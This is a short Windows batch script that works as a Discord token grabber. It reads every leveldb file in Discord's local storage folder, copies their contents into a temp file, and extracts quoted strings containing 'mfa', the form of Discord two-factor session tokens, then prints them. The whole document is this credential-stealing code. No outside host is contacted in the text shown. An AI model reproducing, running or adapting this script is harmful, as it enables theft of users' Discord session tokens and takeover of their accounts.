@echo off
pushd "%appdata%\discord\Local Storage\leveldb"
del "%TMP%\ldb.discord.tok" /q /f > nul 2>&1
for %%A in (*.ldb) do more %%A >> "%TMP%\ldb.discord.tok"
for /f usebackq^ tokens^=2^ delims^=^" %%A in (`findstr /c:"mfa" "%TMP%\ldb.discord.tok"`) do echo:%%A
popd